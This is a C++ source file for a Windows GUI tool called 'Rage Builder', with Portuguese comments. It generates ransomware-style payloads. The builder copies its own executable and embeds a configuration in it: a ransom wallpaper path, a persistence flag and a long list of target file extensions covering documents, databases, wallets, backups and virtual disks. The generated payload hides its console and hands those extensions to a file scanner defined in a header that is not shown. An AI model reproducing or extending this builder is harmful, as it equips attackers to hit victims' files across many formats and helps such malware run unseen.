// rage.cpp
#define UNICODE
#define _UNICODE
#pragma comment(lib, "Comctl32.lib")
#pragma comment(linker,"/manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

#include <windows.h>
#include <commctrl.h>
#include <string>
#include <vector>
#include <iostream>
#include <sstream>

#include "file_scanner.h"

// --- IDs para os nossos controlos da GUI ---
#define IDC_WALLPAPER_EDIT          102
#define IDC_PAYLOAD_EDIT            104
#define IDC_CREATE_BUTTON           105
#define IDC_EXTENSIONS_EDIT         106
#define IDC_FAKE_EDIT               107
#define IDC_PERSISTENCE_CHECK       108

// --- Variáveis globais para os controlos ---
HWND hWallpaperEdit;
HWND hPayloadEdit;
HWND hExtensionsEdit;
HWND hPersistenceCheck;

bool RunAsPayloadIfExists(PWSTR pCmdLine);

// =================================================================================
// O GERADOR DE PAYLOAD: Função chamada quando o botão "Create" é clicado
// =================================================================================
void CreatePayloadAndInjectConfig() {
    wchar_t wallpaperPath[MAX_PATH];
    wchar_t payloadName[MAX_PATH];

    int extensionsLength = GetWindowTextLengthW(hExtensionsEdit) + 1;
    std::vector<wchar_t> extensions(extensionsLength);

    GetWindowTextW(hWallpaperEdit, wallpaperPath, MAX_PATH);
    GetWindowTextW(hPayloadEdit, payloadName, MAX_PATH);
    GetWindowTextW(hExtensionsEdit, extensions.data(), extensionsLength);

    bool isPersistenceEnabled = (IsDlgButtonChecked(GetParent(hPersistenceCheck), IDC_PERSISTENCE_CHECK) == BST_CHECKED);

    std::wstring configString = std::wstring(wallpaperPath) + L"|" + extensions.data() + L"|" + (isPersistenceEnabled ? L"persist_on" : L"persist_off");

    wchar_t currentExePath[MAX_PATH];
    GetModuleFileNameW(NULL, currentExePath, MAX_PATH);

    // PASSO 1: Copiar o executável atual para criar a base do payload
    if (!CopyFileW(currentExePath, payloadName, FALSE)) {
        MessageBoxW(NULL, L"FALHA ao criar a cópia do payload.\nVerifique as permissões.", L"Erro do Gerador - Passo 1", MB_OK | MB_ICONERROR);
        return;
    }

    // PASSO 2: Abrir o novo ficheiro para modificação
    HANDLE hUpdate = BeginUpdateResourceW(payloadName, FALSE);
    if (hUpdate == NULL) {
        MessageBoxW(NULL, L"FALHA ao abrir o payload para modificação.", L"Erro do Gerador - Passo 2", MB_OK | MB_ICONERROR);
        return;
    }

    // PASSO 3: Injetar a configuração
    if (!UpdateResourceW(hUpdate, L"CONFIG_DATA", MAKEINTRESOURCE(101), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)configString.c_str(), (configString.size() + 1) * sizeof(wchar_t))) {
        MessageBoxW(NULL, L"FALHA ao injetar a configuração no payload.", L"Erro do Gerador", MB_OK | MB_ICONERROR);
        EndUpdateResourceW(hUpdate, TRUE);
        return;
    }

    // PASSO 4: Salvar o payload final com a configuração injetada
    if (!EndUpdateResourceW(hUpdate, FALSE)) {
        MessageBoxW(NULL, L"FALHA ao salvar o payload final.", L"Erro do Gerador - Passo 4", MB_OK | MB_ICONERROR);
        return;
    }

    std::wstring successMessage = L"Payload '" + std::wstring(payloadName) + L"' criado com sucesso!";
    MessageBoxW(NULL, successMessage.c_str(), L"Builder", MB_OK | MB_ICONINFORMATION);
}

// =================================================================================
// LÓGICA DA JANELA: Função que trata dos eventos da GUI
// =================================================================================
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE: {
        const wchar_t* defaultExtensions = L".txt|.jar|.dat|.contact|.settings|.doc|.docx|.xls|.xlsx|.ppt|.pptx|.odt|.jpg|.mka|.mhtml|.oqy|.png|.csv|.py|.sql|.mdb|.php|.asp|.aspx|.html|.htm|.xml|.psd|.pdf|.xla|.cub|.dae|.indd|.cs|.mp3|.mp4|.dwg|.zip|.rar|.mov|.rtf|.bmp|.mkv|.avi|.apk|.lnk|.dib|.dic|.dif|.divx|.iso|.7zip|.ace|.arj|.bz2|.cab|.gzip|.lzh|.tar|.jpeg|.xz|.mpeg|.torrent|.mpg|.core|.pdb|.ico|.pas|.db|.wmv|.swf|.cer|.bak|.backup|.accdb|.bay|.p7c|.exif|.vss|.raw|.m4a|.wma|.flv|.sie|.sum|.ibank|.wallet|.css|.js|.rb|.crt|.xlsm|.xlsb|.7z|.cpp|.java|.jpe|.ini|.blob|.wps|.docm|.wav|.3gp|.webm|.m4v|.amv|.m4p|.svg|.ods|.bk|.vdi|.vmdk|.onepkg|.accde|.jsp|.json|.gif|.log|.gz|.config|.vb|.m1v|.sln|.pst|.obj|.xlam|.djvu|.inc|.cvs|.dbf|.tbi|.wpd|.dot|.dotx|.xltx|.pptm|.potx|.potm|.pot|.xlw|.xps|.xsd|.xsf|.xsl|.kmz|.accdr|.stm|.accdt|.ppam|.pps|.ppsm|.1cd|.3ds|.fr|.3g2|.accda|.accdc|.accdw|.adp|.ai|.ai3|.ai4|.ai5|.ai6|.ai7|.ai8|.arw|.ascx|.asm|.asmx|.avs|.bin|.cfm|.dbx|.dcm|.dcr|.pict|.rgbe|.dwt|.f4v|.exr|.kwm|.max|.mda|.mde|.mdf|.mdw|.mht|.mpv|.msg|.myi|.nef|.odc|.geo|.swift|.odm|.odp|.oft|.orf|.pfx|.p12|.pl|.pls|.safe|.tab|.vbs|.xlk|.xlm|.xlt|.xltm|.svgz|.slk|.tar.gz|.dmg|.ps|.psb|.tif|.rss|.key|.vob|.epsp|.dc3|.iff|.onepkg|.onetoc2|.opt|.p7b|.pam|.r3d|.ova";

        // Cria os controlos da GUI
        CreateWindowW(L"STATIC", L"Papel de Parede:", WS_CHILD | WS_VISIBLE, 20, 20, 150, 20, hwnd, NULL, NULL, NULL);
        hWallpaperEdit = CreateWindowW(L"EDIT", L"C:\\Windows\\Wallpaper\\Exemplo\\img.jpg", WS_CHILD | WS_VISIBLE | WS_BORDER, 
            180, 20, 580, 20, hwnd, (HMENU)IDC_WALLPAPER_EDIT, NULL, NULL);

        CreateWindowW(L"STATIC", L"Nome do Payload:", WS_CHILD | WS_VISIBLE, 20, 50, 150, 20, hwnd, NULL, NULL, NULL);
        hPayloadEdit = CreateWindowW(L"EDIT", L"teste.exe", WS_CHILD | WS_VISIBLE | WS_BORDER, 
            180, 50, 580, 20, hwnd, (HMENU)IDC_PAYLOAD_EDIT, NULL, NULL);

        CreateWindowW(L"STATIC", L"Extensoes:", WS_CHILD | WS_VISIBLE, 20, 80, 150, 20, hwnd, NULL, NULL, NULL);
        hExtensionsEdit = CreateWindowW(L"EDIT", defaultExtensions, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_MULTILINE | WS_VSCROLL, 
            180, 80, 580, 100, hwnd, (HMENU)IDC_EXTENSIONS_EDIT, NULL, NULL);

        hPersistenceCheck = CreateWindowW(L"BUTTON", L"Ativar Persistencia",WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX, 
            180, 190, 300, 20, hwnd, (HMENU)IDC_PERSISTENCE_CHECK, NULL, NULL);

        // Marcar a checkbox por padrao
        CheckDlgButton(hwnd, IDC_PERSISTENCE_CHECK, BST_CHECKED);

        CreateWindowW(L"BUTTON", L"Criar Payload", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 320, 230, 150, 30, hwnd, (HMENU)IDC_CREATE_BUTTON, NULL, NULL);
        break;
    }
    case WM_COMMAND: {
        if (LOWORD(wParam) == IDC_CREATE_BUTTON) {
            CreatePayloadAndInjectConfig();
        }
        break;
    }
    case WM_DESTROY: {
        PostQuitMessage(0);
        return 0;
    }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

// =================================================================================
// LÓGICA DO PAYLOAD: Verifica se deve correr como payload ou como builder
// =================================================================================

void RedirectIOToConsole() {
    AllocConsole();
    FILE* fDummy;
    freopen_s(&fDummy, "CONIN$", "r", stdin);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    std::ios::sync_with_stdio();
}

bool RunAsPayloadIfExists(PWSTR pCmdLine) {
    HMODULE hModule = GetModuleHandle(NULL);
    // Procura pela "marca" (o recurso que o builder injeta)
    HRSRC hRes = FindResourceW(hModule, MAKEINTRESOURCE(101), L"CONFIG_DATA");
    if (hRes == NULL) {
        return false; // Marca não encontrada. Deve correr como Builder (GUI).
    }

    // MARCA ENCONTRADA! Executar a lógica do Payload.
    HGLOBAL hResLoad = LoadResource(hModule, hRes);
    if (hResLoad) {
        LPVOID lpResLock = LockResource(hResLoad);
        if (lpResLock) {
            // Verificamos se a linha de comando contém a nossa flag de depuração.
            std::wstring cmdLine(pCmdLine);
            bool isDebugMode = (cmdLine.find(L"--d") != std::wstring::npos || cmdLine.find(L"-debug") != std::wstring::npos);

            if (isDebugMode) {
                // Se a flag estiver presente
                RedirectIOToConsole();
                std::wcout << L"--- DEBUG ATIVADO ---" << std::endl;
            }
            else {
                // Se a flag não estiver presente
                ShowWindow(GetConsoleWindow(), SW_HIDE);
            }

            std::wstring fullConfig((const wchar_t*)lpResLock);

            size_t separatorPos = fullConfig.find(L'|');
            if (separatorPos == std::wstring::npos) return true;

            std::wstring extensionsStr = fullConfig.substr(separatorPos + 1);
            std::vector<std::wstring> extensions;
            std::wstringstream ss(extensionsStr);

            PayloadConfig config;
            config.wallpaperPath = fullConfig.substr(0, separatorPos);

            std::wstring ext;
            while (std::getline(ss, ext, L'|')) {
                if (!ext.empty()) {
                    extensions.push_back(ext);
                }
            }

            FileScanner scanner(extensions);
            scanner.runAsPayload(config);

            if (isDebugMode) {
                std::wcout << L"\n--- Execucao do Payload Concluida. Pressione ENTER para sair. ---" << std::endl;
                std::cin.get();
            }
        }
    }
    return true;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow) {
    if (RunAsPayloadIfExists(pCmdLine)) {
        return 0; // Se for um payload, executa a sua lógica e termina silenciosamente.
    }

    const wchar_t CLASS_NAME[] = L"BuilderWindowClass";
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    RegisterClassW(&wc);

    HWND hwnd = CreateWindowExW(0, CLASS_NAME, L"Rage Builder", WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 850, 350, NULL, NULL, hInstance, NULL);

    if (hwnd == NULL) return 0;

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}